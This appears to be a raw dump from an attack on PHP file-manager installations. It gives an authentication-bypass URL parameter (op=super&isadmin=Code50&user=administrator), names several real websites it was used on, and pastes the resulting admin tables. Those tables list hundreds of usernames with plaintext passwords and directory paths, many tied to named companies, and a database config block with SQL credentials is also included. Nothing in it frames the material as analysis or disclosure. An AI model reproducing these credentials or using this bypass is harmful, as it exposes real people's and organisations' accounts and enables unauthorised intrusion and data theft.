@@ -1,0 +1,545 @@
+fileadmin.php?op=super&isadmin=Code50&user=[admin]
+
+
+http://www.madservers.org/hosting/fileadmin/fileadmin.php?op=super&isadmin=Code50&user=administrator
+
+Username Password Home Admin Info Last Session Delete  
+administrator rs3N7whz  Yes Site Administrator February 17th 2004 Delete 
+tri0n3 rs3N7whz users/tri0n3/ Yes  February 17th 2004 Delete 
+gurkburk gurkburk users/gurkburk/ No  February 17th 2004 Delete 
+test test users/test/ No testuser February 17th 2004 Delete 
+ed00d ed00d users/ed00d/ No ed00d test February 17th 2004 Delete 
+beasten netsaeb users/beasten/ No   Delete 
+kay yak users/kay/ No  February 17th 2004 Delete 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://webfiles.planb-media.de/index.php?op=super&isadmin=Code50&user=administrator
+
+Username	Password	Home	Admin	Info	Last Session	Delete
+administrator	file5KING	files/	Yes	Site Administrator	September 10th 2005	Delete
+upload	jUst4us	files/	No	Root access	August 25th 2005	Delete
+web	mAx53	files/interactive/upload/	No	Upload Web/Interactive	August 10th 2005	Delete
+mobile	tP3scQ	files/mobile/upload/	No	upload mobile	May 13th 2005	Delete
+tv	Ovie8p	files/tv/upload/	No	upload tv	September 9th 2005	Delete
+seb	erik2	files/interactive/seb/	No	SEB Bank	June 17th 2005	Delete
+toi	getBF	files/interactive/toi/	No		June 2nd 2004	Delete
+groovepark	hutz	files/mobile/groovepark	No		September 10th 2005	Delete
+lafarge	newCI2004	files/interactive/lafarge/	No		October 11th 2004	Delete
+handy.de	785ha58	files/mobile/handy.de/	No	Mobile Handy.de	April 21st 2005	Delete
+Vodafone	254vo72	files/mobile/Vodafone/	No	Mobile Vodafone	August 2nd 2005	Delete
+T-Online	587to46	files/mobile/T-Online/	No	Mobile T-Online	July 25th 2005	Delete
+T-Mobile	492tm74	files/mobile/T-Mobile/	No	Mobile T-Mobile	September 5th 2005	Delete
+O2	416oo39	files/mobile/O2/	No	Mobile O2	August 30th 2005	Delete
+Materna	951ma78	files/mobile/Materna/	No	Mobile Materna	September 9th 2005	Delete
+Jamba	458ja39	files/mobile/Jamba/	No	Mobile Jamba	June 15th 2005	Delete
+UCP	852uc64	files/mobile/UCP/	No	Mobile UCP	September 2nd 2005	Delete
+Net-M	934ne55	files/mobile/Net-M/	No	Mobile Net-M	June 10th 2005	Delete
+Major	668mj47	files/mobile/Major/	No	Mobile Major	March 14th 2005	Delete
+living-mobile	663lm22	files/mobile/living-mobile/	No	Mobile living-mobile	March 8th 2005	Delete
+convisual	898cv45	files/mobile/convisual/	No	Mobile convisual	April 20th 2004	Delete
+zed	913ze29	files/mobile/zed/	No	Mobile zed	July 8th 2005	Delete
+download	733do54	files/mobile/download/	No	Mobile download	September 8th 2005	Delete
+Horst	467ho78	files/mobile/Horst/	No	Mobile Horst	March 11th 2005	Delete
+TWP	916tw35	files/mobile/TWP/	No	Mobile TWP	April 18th 2005	Delete
+upload	xKm4st0	files/mobile/upload/	No	Mobile upload		Delete
+Pro7	Content4Pro7	files/mobile/Pro7/	No		April 28th 2005	Delete
+WIS	DBG1intra	files/interactive/WIS/	No		April 4th 2005	Delete
+takomat	imaginepeople	files/interactive/takomat/	No	Account Takomat	October 19th 2004	Delete
+Xenon	Encoder	files/mobile/Xenon/	No		June 23rd 2005	Delete
+gar04field	odin04	files/tv/garfield/	No	itv Game Garfield	November 17th 2004	Delete
+horror	movies	files/mobile/newline/	No		September 9th 2005	Delete
+123multimedia	EnterTain23	files/mobile/123multimedia/	No		August 12th 2005	Delete
+oliver	bunsen	files/interactive/oliver/	No		September 2nd 2005	Delete
+Mobilkom	988er333	files/mobile/mobilkom/	No	Mobile Mobilkom	September 2nd 2005	Delete
+Sunrise	878xu888	files/mobile/sunrise/	No	Mobile Sunrise	September 2nd 2005	Delete
+E-plus	254ee966	files/mobile/e-plus/	No	Mobile Eplus	September 1st 2005	Delete
+Nokia	845er474	files/mobile/nokia/	No	Mobile Nokia	April 24th 2004	Delete
+Handy.ch	111df342	files/mobile/handy.ch/	No	Mobile Handy.ch		Delete
+Condomi	764eq334	files/mobile/condomi/	No	Mobile Condomi	June 9th 2005	Delete
+Midray	677gz211	files/mobile/midray/	No	Mobile Midray	July 28th 2005	Delete
+LMR	874po966	files/mobile/lmr/	No	Mobile LMR	May 31st 2005	Delete
+China	454rt144	files/mobile/china/	No	Mobile China	April 7th 2005	Delete
+quick	easy	files/mobile/stoeve/	No	Mobile Stöve	March 16th 2005	Delete
+Trump	781yx968	files/mobile/trump/	No	Mobile Trump	March 11th 2005	Delete
+frue	ralfi	files/tv/fruehreif/	No		October 1st 2004	Delete
+mobile_demo	mB2pB	files/mobile/demo/	No		May 4th 2005	Delete
+mintmark	fip33S	files/mobile/mintmark/	No		September 5th 2005	Delete
+eurofun	fun4YL	files/mobile/eurofun/	No		September 7th 2005	Delete
+colony21	Hk21R	files/tv/colony21/	No		June 27th 2005	Delete
+skonk	S34lm	files/tv/skonk/	No		September 21st 2004	Delete
+smashballs	UuK3s	files/tv/smashballs/	No		September 21st 2004	Delete
+approval	kiosk2	files/mobile/approval/	No	Approval User	July 15th 2005	Delete
+Planet9	saturn39	files/mobile/planet9/	No	Planet9 Slowenien	September 9th 2005	Delete
+special	special	files/mobile/special/	No	specials	August 26th 2005	Delete
+telering	44xGO	files/mobile/telering/	No	User für Telering Österreich	August 25th 2004	Delete
+Proximus	123Prox	files/mobile/Proximus/	No		September 8th 2005	Delete
+Comverse	files4Comverse	files/mobile/Comverse/	No	Kunde	March 3rd 2005	Delete
+Deutschrock	maiko4U	files/mobile/Deutschrock/	No		October 26th 2004	Delete
+Logophone	Call4LoaD	files/mobile/Logophone/	No		September 1st 2005	Delete
+iclass	dAn76S	files/interactive/iclass/	No		July 7th 2004	Delete
+WoW	cruise	files/mobile/WoW/	No		July 13th 2005	Delete
+ZedFinland	zd	files/mobile/ZedFinland/	No			Delete
+AS_GAME	oktozep	files/tv/AS_GAME/	No		January 19th 2005	Delete
+screws	elvisisback	files/tv/screws/	No		August 27th 2005	Delete
+Swisscom	1zRo42	files/mobile/Swisscom/	No		September 9th 2005	Delete
+Sina	SinA19	files/mobile/sina/	No		August 31st 2004	Delete
+triacom	triacomT5	files/mobile/triacom/	No		August 18th 2004	Delete
+getunwire	getIT	files/mobile/getunwire/	No		July 6th 2005	Delete
+BinQ	Key4BinQ	files/mobile/BinQ/	No		August 8th 2005	Delete
+mobile_tv	mobiletv	files/mobile/mobiletv/	No			Delete
+oplayo	2play42i	files/mobile/oplayo/	No		February 21st 2005	Delete
+smsat	smsat	files/mobile/smsat/	No		July 8th 2005	Delete
+iTouch	TouchIT	files/mobile/iTouch/	No		August 12th 2005	Delete
+premiere	PR1MEtime	files/tv/premiere/	No		July 23rd 2005	Delete
+Mig99	Content4U	files/mobile/Mig99/	No		July 18th 2005	Delete
+TELTEX	ContTex	files/mobile/TELTEX/	No		July 6th 2005	Delete
+Talkline	TalkTalkTalk	files/mobile/Talkline/	No		April 14th 2005	Delete
+Klingelton	Ring-Ring	files/mobile//Klingelton/	No		August 26th 2005	Delete
+MindMatics	plan_c-media	files/mobile/MindMatics/	No		September 8th 2005	Delete
+Distraction	Formats	files/mobile/DistractionFormats/	No		May 25th 2005	Delete
+Turkcell	turkey	files/mobile/Turkcell/	No		March 16th 2005	Delete
+gsn	Klimmzuege	files/tv/gsn/	No		September 23rd 2004	Delete
+Holger	Sprengel	files/mobile/Sprengel/	No		July 12th 2005	Delete
+datawarehouse	123dw45	files/mobile/datawarehouse/	No		September 29th 2004	Delete
+salzburg	salz2004	files/interactive/salzburg/	No		September 22nd 2004	Delete
+m-squad	m-Content	files/mobile/m-squad/	No		September 17th 2004	Delete
+outerim	oP43qs	files/tv/outerim/	No		September 23rd 2004	Delete
+Mobileview	ViewContent	files/mobile/Mobileview/	No		September 8th 2005	Delete
+vodafone	kater	files/mobile/vodafone/	No			Delete
+MS	MS321	files/mobile/mobilesolutions/	No		January 20th 2005	Delete
+vP	vp0409	files/mobile/Voicepuplishing/	No		September 1st 2005	Delete
+thq	qht66A	files/mobile/thq/	No		September 28th 2004	Delete
+VictorVox	118VICTOR	files/mobile/VictorVox/	No		August 12th 2005	Delete
+ContNet	NetContent	files/mobile/ContNet/	No		March 30th 2005	Delete
+MM-Merchandising	magritte	files/mobile/MM-Merchandising/	No		November 22nd 2004	Delete
+inossous	horoskop	files/mobile/Video-Horoskop/	No		July 11th 2005	Delete
+VoxMobile	VOX4U	files/mobile/VoxMobile/	No		December 7th 2004	Delete
+petey_jaydee	yeah	files/mobile/petey_jaydee/	No	Petey & Jaydee	March 23rd 2005	Delete
+hellmann	lollis	files/mobile/hellmann/	No		January 13th 2005	Delete
+redcircle	ennk455	files/mobile/redcircle/	No		January 5th 2005	Delete
+unwired	cartoons	files/mobile/unwired/	No		April 9th 2005	Delete
+Charamel	Drops4U	files/mobile/Charamel/	No		April 18th 2005	Delete
+Zingy	Content4U	files/mobile/Zingy/	No		February 9th 2005	Delete
+bullspress	content4U	files/mobile/bullspress/	No		December 17th 2004	Delete
+kai	NY55king	files/interactive/kai/	No		April 19th 2005	Delete
+AM-M	amm4U	files/mobile/AM-M/	No		June 7th 2005	Delete
+Circuit Girls	GirlsGirlsGirls	files/mobile/Circuit Girls/	No		September 5th 2005	Delete
+drei	VierFünf	files/mobile/drei/	No		August 22nd 2005	Delete
+Jamster	Content4U	files/mobile/Jamster/	No		January 27th 2005	Delete
+rappcollins	enter4rc	files/mobile/rappcollins/	No		August 30th 2005	Delete
+zdf	zdf	files/mobile/zdf/	No	ZDF Material	January 26th 2005	Delete
+schmidt	enter37schmidt	files/mobile/schmidt/	No		May 4th 2005	Delete
+regional	enter4Robert	files/tv/regio/	No		April 26th 2005	Delete
+BobMobile	BobIT	files/mobile/BobMobile/	No		September 1st 2005	Delete
+nypd	nypd_games	files/mobile/NYPD/	No	NYPD Content	February 1st 2005	Delete
+jojo	zweitevonrechts	files/tv/Jojo/	No		February 2nd 2005	Delete
+LucasEntertainment	Lutz	files/mobile/LucasEntertainment/	No		February 6th 2005	Delete
+Star Wars	skywalker	files/mobile/Star Wars/	No		August 23rd 2005	Delete
+Rogers	Content4U	files/mobile/Rogers/	No		February 10th 2005	Delete
+license	kiosk-Plan_b	files/mobile/license/	No		June 10th 2005	Delete
+ohmtv	dvd2005COPY	files/mobile/ohmtv/	No		August 25th 2005	Delete
+universal	universal	files/mobile/universal/	No		July 14th 2005	Delete
+Eastside-Studios	northWEST	files/mobile/Eastside-Studios/	No		June 8th 2005	Delete
+plan_b	film	files/tv/plan_b/	No	Plan_b Film	September 2nd 2005	Delete
+MindMatics	plan_c-media	files/mobile/MindMatics/	No			Delete
+Dropin-TV	action	files/mobile/Dropin-TV/	No		August 16th 2005	Delete
+wellmeyer	klAwitt3r	files/mobile/wellmeyer/	No		June 14th 2005	Delete
+heike	laura	files/tv/heike/	No		April 29th 2005	Delete
+Ohm-tv	dvd2005COPY	files/mobile/ohmtv/	No		August 15th 2005	Delete
+Fiveworks	Content4U	files/mobile/Fiveworks/	No		June 21st 2005	Delete
+ericsson	china		No		April 7th 2005	Delete
+maus	klickklick	files/tv/maus/	No	Austauschordner "Die Maus"	June 30th 2005	Delete
+planb	exchange	files/mobile/jennifer/	No		August 25th 2005	Delete
+fh	e9k7b0	files/mobile/fh/	No		March 30th 2005	Delete
+MoMedia	lukas	files/mobile/MoMedia/	No		September 1st 2005	Delete
+Trendwerk77	trend66	files/mobile/Trendwerk77/	No		March 30th 2005	Delete
+mtvgame	athome	files/mobile/mtv/	No	MTV Games	August 8th 2005	Delete
+Sony	Ericsson	files/mobile/SonyEricsson/	No		August 22nd 2005	Delete
+zebralution	streifentier	files/mobile/zebralution/	No	Zebralution Content	July 25th 2005	Delete
+lillian	china	files/mobile/EricssonChina/	No		May 9th 2005	Delete
+vindigo	WOTW2005	files/mobile/vindigo/	No		July 11th 2005	Delete
+Horizont	StarWars	files/mobile/Horizont/	No		April 12th 2005	Delete
+presentation	mobile	files/mobile/presentation/	No		August 29th 2005	Delete
+USA	NewYork	files/mobile/USA/	No		June 8th 2005	Delete
+Mediaplazza	paris	files/mobile/Mediaplazza/	No		August 16th 2005	Delete
+tmobile	hungary	files/mobile/tmobilehungary/	No		May 12th 2005	Delete
+klingel	ton	files/mobile/klingelton/	No		May 10th 2005	Delete
+moustik	mo2305	files/mobile/moustik/	No		July 19th 2005	Delete
+mindmatics2005	sony	files/mobile/mindsony/	No		June 10th 2005	Delete
+rtlII	ltr2	files/mobile/rtlII	No		August 4th 2005	Delete
+video	showreel	files/mobile/videoshow/	No		September 9th 2005	Delete
+Xtreme	Sports	files/mobile/XtremeSports/	No		July 6th 2005	Delete
+private	f4tgh7	files/mobile/private/	No		August 19th 2005	Delete
+startv	bacaee	files/tv/startv/	No		August 17th 2005	Delete
+T-Mobile-international	mobileTHEworld	files/mobile/T-Mobile-international/	No		June 21st 2005	Delete
+One	23four5	files/mobile/One/	No		July 13th 2005	Delete
+Musiwave	WaVe	files/mobile/Musiwave/	No		July 1st 2005	Delete
+tomwil	stunts	files/mobile/tomwil/	No		August 1st 2005	Delete
+action	concept	files/mobile/kampfansage/	No		July 6th 2005	Delete
+Masiya	Marwa	files/mobile/masiya/	No			Delete
+Premiere-TV	Premiere	files/mobile/Premiere-TV/	No		September 8th 2005	Delete
+Jonas	daydream	files/mobile/Daydream/	No		July 28th 2005	Delete
+netograms	gruss	files/mobile/Netograms/	No		July 7th 2005	Delete
+rachel	contentcard	files/mobile/rachel/	No		July 7th 2005	Delete
+Webmiles	SalaMander	files/mobile/Webmiles/	No		July 25th 2005	Delete
+tiki	wackelpudding	files/tv/tiki/	No		September 5th 2005	Delete
+starcut	cutstar	files/mobile/starcut/	No		July 27th 2005	Delete
+NBC	cbn	files/tv/NBC/	No		July 26th 2005	Delete
+Erotic	xxx123com	files/mobile/erotik/	No		August 9th 2005	Delete
+arait	multimedia	files/mobile/navero/	No		July 28th 2005	Delete
+e-tv	blop7T	files/mobile/e-tv/	No		July 28th 2005	Delete
+kraftstoffmedia	shell	files/mobile/kraftstoffmedia/	No		July 28th 2005	Delete
+rtl2	video	files/mobile/rtl2/	No		August 9th 2005	Delete
+MOB-3D	zahnraeder	files/mobile/MOB-3D/	No		September 2nd 2005	Delete
+3uni	trespuntos	files/mobile/3uni/	No		August 10th 2005	Delete
+2288.com	3399	files/mobile/2288.com/	No		August 25th 2005	Delete
+constantin	dannecker	files/mobile/constantin/	No		August 11th 2005	Delete
+content	planb	files/mobile/upload/plan_b_content/	No		August 18th 2005	Delete
+keycom	com5GuiDo	files/mobile/keycom/	No		August 16th 2005	Delete
+davis	starz2005	files/mobile/fonestarz/	No		August 30th 2005	Delete
+
+
+Create User
+
+
+Create User
+
+
+
+Username Password Home Admin Info Last Session Delete  
+administrator 123123 ../upload/ Yes Site Administrator November 7th 2004 Delete 
+arzynik hello ../upload/files/ No  November 7th 2004 Delete 
+dynamixz khang ../upload/files/ No  November 7th 2004 Delete 
+goglay qwe123 ../upload/files/ Yes Co-Administrator November 7th 2004 Delete 
+
+
+
+$adminfile = $SCRIPT_NAME;
+$sitetitle = "Apez File Manager";
+$sqlserver = "localhost";
+$sqluser = "apezorg_upload";
+$sqlpass = "123123";
+$sqldb = "apezorg_upload";
+$sqltable = "fileadmin";
+
+
+
+
+
+
+
+http://www.piccoloteatromilano.it/fm/?op=super&isadmin=Code50&user=administrator
+
+
+Utente	Password	Home	Admin	Info	Ultima sessione	Cancella
+administrator	drosophila33	/	Si	Site Administrator	April 21st 2005	Cancella
+root	piccolo_www	/	No	Root access	April 21st 2005	Cancella
+ColomboS	scilla	files/ColomboS/	No	Utente Archivio Fotografico	July 21st 2005	Cancella
+ColomboT	settenani	files/ColomboT/	No	Tommaso Colombo	July 14th 2005	Cancella
+UfficioStampa	password	files/UfficioStampa/	No	Utente Ufficio Stampa		Cancella
+Marketing	pippo	files/Marketing/	No	Utente Ufficio Marketing (Vasta)	July 25th 2005	Cancella
+Spot	stagione	files/Spot/	No	Utente Ufficio Marketing (Finotti)	July 29th 2005	Cancella
+Trasferta	trasferta	files/Trasferta/	No	Amministratori Compagnia	April 21st 2005	Cancella
+
+
+
+
+
+
+
+http://www.nosn.nl/libra/fileadmin.php?op=super&isadmin=Code50&user=administrator
+Username	Password	Home	Admin	Info	Last Session	Delete
+administrator	admin	files/	Yes	Site Administrator	September 7th 2004	Delete
+nathan	nathan	files/	Yes	Site Administrator	November 7th 2004	Delete
+jelmer	wwwddaxogphu	files/	Yes	Site Administrator	November 9th 2004	Delete
+
+
+
+
+http://www.loxnet.de/fileadmin/?op=super&isadmin=Code50&user=administrator
+
+
+Username	Password	Home	Admin	Info	Last Session	Delete
+administrator	libra	/home/www/web209/html/fileadmin/files/	Yes	Site Administrator	June 27th 2005	Delete
+malte	onken85	/home/www/web209/html/fileadmin/files/	No	Malte Onken		Delete
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://www.dravenfield.com/edit/?op=super&isadmin=Code50&user=administrator
+Username	Password	Home	Admin	Info	Last Session	Delete
+administrator	sanskirt	/home/httpsd/htdocs/users/	Yes	Site Administrator	November 26th 2003	Delete
+merchant	sanskirt	/home/httpsd/htdocs/users/	Yes		May 26th 2005	Delete
+anderson	sandstone	/home/httpsd/htdocs/users/anderson/	No	Anderson Estates (Documents)	August 16th 2005	Delete
+emjae	billy	/home/httpd/htdocs/emjae/	No		April 29th 2005	Delete
+jinxgirls	billy	/home/httpd/htdocs/jinxgirls/	No		January 26th 2004	Delete
+
+
+Create User
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+more for planb
+Username	Password	Home	Admin	Info	Last Session	Delete
+Administrator	file5KING	files/	Yes	Site Administrator	June 1st 2006	Delete
+upload	jUst4us	files/	No	Root access	April 28th 2006	Delete
+linkage	4linkAGE	files/mobile/linkage/	No		November 28th 2005	Delete
+planbNY	NewYork	files/interactive/planbNY/	No		May 31st 2006	Delete
+web	mAx53	files/interactive/upload/	No	Upload Web/Interactive	April 11th 2006	Delete
+Buongiorno	Wasilios	files/mobile/Buongiorno/	No		May 30th 2006	Delete
+e-tv	4komp	files/mobile/e-tv/	No		March 30th 2006	Delete
+seb	erik2	files/interactive/seb/	No	SEB Bank	May 30th 2006	Delete
+reiss	kolja	files/mobile/reiss/	No		April 13th 2006	Delete
+generamobile	gmobile	files/mobile/generamobile/	No		June 1st 2006	Delete
+T-Mobile Hungary	Content4You	files/mobile/T-Mobile_hungary/	No		April 18th 2006	Delete
+Vodafone	254vo72	files/mobile/Vodafone/	No	Mobile Vodafone	May 2nd 2006	Delete
+T-Online	587to46	files/mobile/T-Online/	No	Mobile T-Online	May 10th 2006	Delete
+T-Mobile	492tm74	files/mobile/T-Mobile/	No	Mobile T-Mobile	May 31st 2006	Delete
+O2	416oo39	files/mobile/O2/	No	Mobile O2	April 26th 2006	Delete
+Materna	951ma78	files/mobile/Materna/	No	Mobile Materna	May 29th 2006	Delete
+Jamba	458ja39	files/mobile/Jamba/	No	Mobile Jamba	April 10th 2006	Delete
+Net-M	934ne55	files/mobile/Net-M/	No	Mobile Net-M	April 7th 2006	Delete
+Distraction	Formats	files/mobile/Distraction/	No		April 21st 2006	Delete
+USAvideo	NewYork	files/mobile/USAvideo/	No		May 31st 2006	Delete
+convisual	898cv45	files/mobile/convisual/	No	Mobile convisual	February 24th 2006	Delete
+zed	913ze29	files/mobile/zed/	No	Mobile zed	February 10th 2006	Delete
+download	733do54	files/mobile/download/	No	Mobile download	April 21st 2006	Delete
+MCSSH	gottburg	files/mobile/MCSSH/	No		May 31st 2006	Delete
+MobileTV	MobileTV	files/mobile/mobiletv/	No		January 3rd 2006	Delete
+Eurotel	Content4you	files/mobile/Eurotel/	No		May 11th 2006	Delete
+Goleo	go4goleo	files/mobile/Goleo/	No		May 31st 2006	Delete
+horror	movies	files/mobile/newline/	No		October 28th 2005	Delete
+Drei	Content	files/mobile/DreiContent/	No		May 30th 2006	Delete
+dodgeboy	vierzweisechs	files/interactive/Carlo/	No		March 22nd 2006	Delete
+oliver	bunsen	files/interactive/oliver/	No		May 31st 2006	Delete
+Mobilkom	988er333	files/mobile/mobilkom/	No	Mobile Mobilkom	April 20th 2006	Delete
+Sunrise	878xu888	files/mobile/sunrise/	No	Mobile Sunrise	February 7th 2006	Delete
+E-plus	254ee966	files/mobile/e-plus/	No	Mobile Eplus	December 8th 2005	Delete
+trickstudio	moviez4us	files/mobile/Trickstudio/	No		March 31st 2006	Delete
+Condomi	764eq334	files/mobile/condomi/	No	Mobile Condomi	June 9th 2005	Delete
+Erotic	go4erotic	files/mobile/Erotic/	No		May 31st 2006	Delete
+mobile_demo	mB2pB	files/mobile/demo/	No		September 29th 2005	Delete
+eurofun	fun4YL	files/mobile/eurofun/	No		May 19th 2006	Delete
+Planet9	saturn39	files/mobile/planet9/	No	Planet9 Slowenien	May 30th 2006	Delete
+special	special	files/mobile/special/	No	specials	May 11th 2006	Delete
+telering	44xGO	files/mobile/telering/	No	User für Telering Österreich	February 3rd 2006	Delete
+Wall	brick4brick	files/mobile/Wall/	No		March 30th 2006	Delete
+Kim	content4ME	files/mobile/Kim/	No		May 12th 2006	Delete
+Logophone	Call4LoaD	files/mobile/Logophone/	No		May 2nd 2006	Delete
+Innovationen	Ax55nl	files/interactive/	No		March 24th 2006	Delete
+WoW	cruise	files/mobile/WoW/	No		September 14th 2005	Delete
+USA1	NewYork	files/mobile/USA1/	No		April 20th 2006	Delete
+Swisscom	1zRo42	files/mobile/Swisscom/	No		May 24th 2006	Delete
+Innovationen	Ax55nl	files/interactive/Carlo/Innovationen/	No			Delete
+framfab	155fram1	files/mobile/framfab/	No		March 27th 2006	Delete
+getunwire	getIT	files/mobile/getunwire/	No		October 24th 2005	Delete
+BinQ	Key4BinQ	files/mobile/BinQ/	No		May 8th 2006	Delete
+smsat	smsat	files/mobile/smsat/	No		November 3rd 2005	Delete
+iTouch	TouchIT	files/mobile/iTouch/	No		August 12th 2005	Delete
+premiere	PR1MEtime	files/tv/premiere/	No		May 30th 2006	Delete
+Talkline	TalkTalkTalk	files/mobile/Talkline/	No		November 15th 2005	Delete
+Klingelton	Ring-Ring	files/mobile//Klingelton/	No		March 9th 2006	Delete
+buehler_LA	buehler_LA	files/mobile/buehler_LA/	No		May 29th 2006	Delete
+MindMatics	planc-media	files/mobile/MindMatics/	No		May 30th 2006	Delete
+MM_FCB	MM_League	files/interactive/FC_Barcelona/	No		February 16th 2006	Delete
+vodafone	kater	files/mobile/vodafone/	No			Delete
+vP	vp0409	files/mobile/Voicepuplishing/	No		November 23rd 2005	Delete
+MME	loveparade	files/mobile/MME/	No		May 24th 2006	Delete
+VoxMobile	VOX4U	files/mobile/VoxMobile/	No		May 30th 2006	Delete
+redcircle	ennk455	files/mobile/redcircle/	No		February 21st 2006	Delete
+planbAUT	planb_AUT	files/mobile/planbAUT/	No		May 29th 2006	Delete
+plan.net	M&M	files/mobile/plan.net/	No		April 6th 2006	Delete
+rappcollins	enter4rc	files/mobile/rappcollins/	No		August 30th 2005	Delete
+Mobilfon	Mobil951fon	files/mobile/Mobilfon/	No		April 10th 2006	Delete
+BobMobile	BobIT	files/mobile/BobMobile/	No		May 16th 2006	Delete
+chooz	interactive	files/mobile/chooz/	No		May 31st 2006	Delete
+license	kiosk-Plan_b	files/mobile/license/	No		January 31st 2006	Delete
+ohmtv	dvd2005COPY	files/mobile/ohmtv/	No		June 1st 2006	Delete
+universal	universal	files/mobile/universal/	No		July 14th 2005	Delete
+plan_b	film	files/tv/plan_b/	No	Plan_b Film	May 26th 2006	Delete
+MindMatics	plan_c-media	files/mobile/MindMatics/	No			Delete
+Nurostudios	multiface	files/mobile/Nurostudios/	No		May 31st 2006	Delete
+black	magic	files/mobile/blackmagic/	No		April 28th 2006	Delete
+heike	laura	files/tv/heike/	No		November 4th 2005	Delete
+Ohm-tv	dvd2005COPY	files/mobile/ohmtv/	No		May 30th 2006	Delete
+jennifer	221177	files/mobile/jennifer/	No		May 23rd 2006	Delete
+Sony	Ericsson	files/mobile/SonyEricsson/	No		November 15th 2005	Delete
+Ericsson	Ericsson	files/mobile/ericsson/	No		January 31st 2006	Delete
+ad	content4me	files/mobile/ad/	No		June 1st 2006	Delete
+Keycom	4KeycomONLY	files/mobile/Keycom/	No		April 28th 2006	Delete
+presentation	mobile	files/mobile/presentation/	No		February 14th 2006	Delete
+USA	NewYork	files/mobile/USA/	No		June 1st 2006	Delete
+brandnew	brandnewcontent	files/mobile/brandnewworld/	No		April 25th 2006	Delete
+klingel	ton	files/mobile/klingelton/	No		April 3rd 2006	Delete
+moustik	mo2305	files/mobile/moustik/	No		March 24th 2006	Delete
+mindmatics2005	sony	files/mobile/mindsony/	No		June 10th 2005	Delete
+Endemol	EndemolABC	files/mobile/Endemol/	No		April 28th 2006	Delete
+rtlII	ltr2	files/mobile/rtlII	No		August 4th 2005	Delete
+video	showreel	files/mobile/videoshow/	No		May 31st 2006	Delete
+MobileEntertainment	NewYork	files/mobile/MobileEntertainment/	No		April 3rd 2006	Delete
+private	f4tgh7	files/mobile/private/	No		August 19th 2005	Delete
+startv	bacaee	files/tv/startv/	No		April 11th 2006	Delete
+One	23four5	files/mobile/One/	No		May 30th 2006	Delete
+tomwil	stunts	files/mobile/tomwil/	No		January 6th 2006	Delete
+action	concept	files/mobile/kampfansage/	No		May 23rd 2006	Delete
+planbDE	planC	files/mobile/planbDE/	No		May 24th 2006	Delete
+Premiere-TV	Premiere	files/mobile/Premiere-TV/	No		September 8th 2005	Delete
+netograms	gruss	files/mobile/Netograms/	No		July 7th 2005	Delete
+rachel	contentcard	files/mobile/rachel/	No		July 7th 2005	Delete
+tiki	wackelpudding	files/tv/tiki/	No		September 19th 2005	Delete
+starcut	cutstar	files/mobile/starcut/	No		May 30th 2006	Delete
+NBC	cbn	files/tv/NBC/	No		July 26th 2005	Delete
+simobil	rocknroll	files/mobile/simobil/	No		April 5th 2006	Delete
+arait	multimedia	files/mobile/navero/	No		February 20th 2006	Delete
+rtl2	video	files/mobile/rtl2/	No		August 9th 2005	Delete
+MOB-3D	zahnraeder	files/mobile/MOB-3D/	No		September 2nd 2005	Delete
+Andi	content4me	files/mobile/Andi/	No		February 7th 2006	Delete
+itv	itv-upload	files/tv/itv/	No		April 13th 2006	Delete
+HuiBuh	BalDuin	files/mobile/HuiBuh/	No		April 12th 2006	Delete
+constantin	dannecker	files/mobile/constantin/	No		May 4th 2006	Delete
+content	planb	files/mobile/upload/plan_b_content/	No		May 26th 2006	Delete
+keycom	com5GuiDo	files/mobile/keycom/	No		August 16th 2005	Delete
+planb	suedamerika	files/mobile/suedamerika/	No		February 22nd 2006	Delete
+MM-Kunde	wage	files/mobile/MM-Kunde/	No		May 20th 2006	Delete
+qpass	Pass4Q	files/mobile/qpass/	No		April 21st 2006	Delete
+UKContent	mobile	files/mobile/UKContent/	No		November 21st 2005	Delete
+Kelly Trump	Erotic	files/mobile/Kelly Trump/	No		October 14th 2005	Delete
+Icemobile	Ice153Mobile	files/mobile/Icemobile/	No		April 10th 2006	Delete
+UK	content4UK	files/mobile/UK/	No		May 29th 2006	Delete
+ringring	jahallo	files/mobile/ringring/	No		April 28th 2006	Delete
+3UK	3UK	files/mobile/3uk/	No		May 30th 2006	Delete
+Dimoco	Ruuudi	files/mobile/Dimoco/	No		June 1st 2006	Delete
+AT	AT	files/mobile/AT/	No		May 29th 2006	Delete
+digame_mobile	mulle	files/mobile/digame_mobile/	No		September 28th 2005	Delete
+calista	mobile	files/mobile/calista/	No		May 19th 2006	Delete
+TastyTones	go4TT	files/mobile/TastyTones/	No		May 31st 2006	Delete
+Arvato	mobile	files/mobile/ArvatoMobile/	No		January 9th 2006	Delete
+planbNY1	NewYork	files/mobile/planbNY1/	No	plan_b New York	May 31st 2006	Delete
+Gameloft	planb	files/mobile/Gameloft/	No		January 5th 2006	Delete
+giantmobile	hustler	files/mobile/hustler/	No		October 26th 2005	Delete
+DaDaMobile	DaDaDa	files/mobile/DaDaMobile/	No		October 25th 2005	Delete
+aximus	Maximus	files/mobile/aximus/	No		January 10th 2006	Delete
+Rainproductions	DropS	files/mobile/Rainproductions/	No		May 9th 2006	Delete
+EG	group4U	files/mobile/expansion-group/	No		May 18th 2006	Delete
+Sprint	Content4U	files/mobile/Sprint/	No		March 14th 2006	Delete
+MobilityZone	Zone4U	files/mobile/MobilityZone/	No		November 4th 2005	Delete
+aol	comein	files/mobile/aol/	No		March 27th 2006	Delete
+Burda	753Burda	files/mobile/Burda/	No		June 1st 2006	Delete
+Mobiz	Celebrity	files/mobile/Mobiz/	No		May 10th 2006	Delete
+benq	siemens	files/mobile/benq/	No		March 7th 2006	Delete
+Setanta	Setanta	files/mobile/Setanta/	No		May 31st 2006	Delete
+welt	ruf	files/mobile/weltruf/	No		April 11th 2006	Delete
+RTL	tvstation	files/mobile/RTL/	No		December 6th 2005	Delete
+agroconcept	nufarm	files/mobile/agroconcept/	No		November 25th 2005	Delete
+Nostromo	content4Nostromo	files/mobile/Nostromo/	No		December 7th 2005	Delete
+eFusion	FuseU	files/mobile/eFusion/	No		March 20th 2006	Delete
+MTelecom	URtelecom	files/mobile/MTelecom/	No		May 19th 2006	Delete
+dsf	moreclips	files/mobile/dsf/	No		November 30th 2005	Delete
+playfon	4playfonONLY	files/mobile/playfon/	No		April 26th 2006	Delete
+peppermint	patty	files/mobile/peppermint/	No		May 3rd 2006	Delete
